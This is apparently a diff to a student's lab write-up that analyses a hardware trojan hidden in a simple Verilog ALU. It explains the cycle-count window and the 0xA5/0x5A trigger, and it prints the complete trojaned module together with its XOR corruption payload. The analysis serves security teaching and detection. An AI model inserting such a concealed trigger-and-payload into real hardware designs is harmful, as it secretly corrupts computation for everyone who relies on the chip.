@@ -81,8 +81,82 @@ wire trojan_condition = trojan_active &&
 ```
 This shows that the time is not the only trigger for the trojan. While the trojan is active during the cycle window, if 0xA5 and 0x5A are added together (opcode 0 is addition), then the trojan condition becomes true. Wires are special in verilog. They are constantly recomputed each time the variables change, meaning that only while these specific conditions are true is the condition activated. They also don't rely on variables so no "trojan_condition" variable is actively stored, making it more difficult to detect.
 ## Payload effect
-The payload
+The payload effect is twofold. First, it xors the normal result by 0x02. Then it returns that result instead of the normal result if the trojan condition is enabled. This can be seen here:
+```verilog
+wire [7:0] trojan_payload = normal_result ^ 8'h02;
+always @(*) begin
+    if (trojan_condition)
+        result = trojan_payload;
+    else
+        result = normal_result;
+end
+```
+Unlike what we've seen in class, this trojan focuses on corruption and compromising integrity rather than leaking secrets like keys. 
 ## Where the RTL was modified
+The added code and variables were shown throughout the parts above with analysis. The biggest takeaway is that there's no need for a simple ALU to need to keep track of clock cycles so looking into why it was recording them allowed me to understand how the code works and how the trojan is activated while staying concealed. Here's a diff showing the lines that changed vs. the ones that remained the same:
+```diff
+module alu_simple(
+-    input [7:0] a, b,
++    input clk,
++    input reset,
++    input [7:0] a,
++    input [7:0] b,
+     input [2:0] op,
+     output reg [7:0] result
+);
+
+- always @(*) begin
+-     case(op)
+-         3'b000: result = a + b;
+-         3'b001: result = a - b;
+-         3'b010: result = a & b;
+-         3'b011: result = a | b;
+-         default: result = 8'b0;
+-     endcase
+- end
++    reg [7:0] normal_result;
++    reg [15:0] cycle_cnt;
++    reg trojan_active;
++
++    always @(*) begin
++        case (op)
++            3'b000: normal_result = a + b;
++            3'b001: normal_result = a - b;
++            3'b010: normal_result = a & b;
++            3'b011: normal_result = a | b;
++            default: normal_result = 8'b0;
++        endcase
++    end
++
++    always @(posedge clk or posedge reset) begin
++        if (reset) begin
++            cycle_cnt <= 16'b0;
++            trojan_active <= 1'b0;
++        end else begin
++            cycle_cnt <= cycle_cnt + 16'b1;
++            if (cycle_cnt == 16'h0F0F)
++                trojan_active <= 1'b1;
++            else if (cycle_cnt == 16'h0F1F)
++                trojan_active <= 1'b0;
++        end
++    end
++
++    wire trojan_condition = trojan_active &&
++                            (a == 8'hA5) &&
++                            (b == 8'h5A) &&
++                            (op == 3'b000);
++
++    wire [7:0] trojan_payload = normal_result ^ 8'h02;
++
++    always @(*) begin
++        if (trojan_condition)
++            result = trojan_payload;
++        else
++            result = normal_result;
++    end
+
+endmodule
+```
 
 # Task 3. Cross-sample comparison
 
